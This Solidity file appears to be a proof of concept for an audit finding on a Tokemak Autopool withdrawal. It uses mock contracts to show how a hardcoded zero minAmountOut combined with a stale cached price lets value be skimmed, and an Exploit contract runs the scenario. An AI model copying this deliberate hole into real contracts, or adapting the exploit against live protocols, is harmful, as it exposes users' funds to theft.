// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// AuditVault 53521 - Tokemak Autopool withdraw.
// Cached debt still prices asset A at 1 ether, but the true price is 2 ether.
// withdraw burns 100 dvA for a 100 ether withdrawal and calls the destination
// swap with minAmountOut = 0. The sandwiched fill pays only the stale 100 ether
// and the other 100 ether (50 A of appreciation) is skimmed.

contract ERC20Mini {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract DestinationVault {
    ERC20Mini public eth;
    uint256 public cachedPrice = 1 ether;
    uint256 public truePrice = 2 ether;
    uint256 public sharesA = 100 ether;
    uint256 public lastSkim;
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    constructor(ERC20Mini _eth) {
        eth = _eth;
    }

    function withdrawBaseAsset(uint256 dvShares, uint256 minAmountOut) external returns (uint256 paid) {
        uint256 fair = dvShares * truePrice / 1 ether; // S:fair
        paid = dvShares * cachedPrice / 1 ether; // S:paid
        uint256 skim = fair - paid; // S:diff
        require(paid >= minAmountOut, "slippage"); // S:min
        sharesA -= dvShares; // S:burn
        lastSkim = skim; // S:record
        eth.transfer(msg.sender, paid); // S:topool
        eth.transfer(SINK, skim); // S:skimto
    }
}

contract Autopool {
    ERC20Mini public eth;
    DestinationVault public dest;
    mapping(address => uint256) public shares;

    constructor(ERC20Mini _eth, DestinationVault _dest) {
        eth = _eth;
        dest = _dest;
    }

    function seed(address who, uint256 amt) external {
        shares[who] = amt;
    }

    function withdraw(uint256 assets) external returns (uint256 got) {
        require(shares[msg.sender] >= assets, "shares"); // S:sh
        shares[msg.sender] -= assets; // S:deb
        uint256 price = dest.cachedPrice(); // S:cached
        uint256 dvShares = assets * 1 ether / price; // S:dv
        // @> VULN: minAmountOut is hardcoded to 0, so the stale cached fill is accepted
        got = dest.withdrawBaseAsset(dvShares, 0); // S:vuln
        eth.transfer(msg.sender, got); // S:user
    }
}

contract Exploit {
    ERC20Mini public eth;
    DestinationVault public dest;
    Autopool public pool;
    uint256 public userGot;
    uint256 public skimmed;

    function run() external {
        eth = new ERC20Mini("WETH");
        dest = new DestinationVault(eth);
        pool = new Autopool(eth, dest);
        eth.mint(address(dest), 200 ether);
        pool.seed(address(this), 100 ether);
        userGot = pool.withdraw(100 ether);
        skimmed = dest.lastSkim();
    }
}
